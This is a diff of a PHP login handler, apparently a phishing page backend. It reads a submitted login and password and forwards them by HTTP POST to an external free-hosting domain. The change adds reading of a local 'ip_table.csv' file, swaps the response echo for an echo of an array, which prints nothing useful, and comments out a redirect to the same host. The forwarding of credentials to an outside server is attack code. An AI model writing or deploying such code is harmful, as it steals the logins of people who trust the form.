@@ -4,6 +4,24 @@
     $login = htmlspecialchars($_POST['login']);
     $password  = htmlspecialchars($_POST['password']);
 
+    $filename = './secure/ip_table.csv';
+    $data = [];
+
+    // open the file
+    $f = fopen($filename, 'r');
+
+    if ($f === false) {
+        die('Cannot open the file ' . $filename);
+    }
+
+    // read each line in CSV file at a time
+    while (($row = fgetcsv($f)) !== false) {
+        $data[] = $row;
+    }
+
+    // close the file
+    fclose($f);
+
     $postdata = http_build_query(
         array(
             'login' => $login,
@@ -19,7 +37,7 @@
     );
     $context = stream_context_create($opts);
     $result = file_get_contents('https://sparkling1234.000webhostapp.com/', false, $context);
-    echo $result;
+    echo $data;
 
-    header('Location: '."https://sparkling1234.000webhostapp.com/");
+    // header('Location: '."https://sparkling1234.000webhostapp.com/");
 ?>
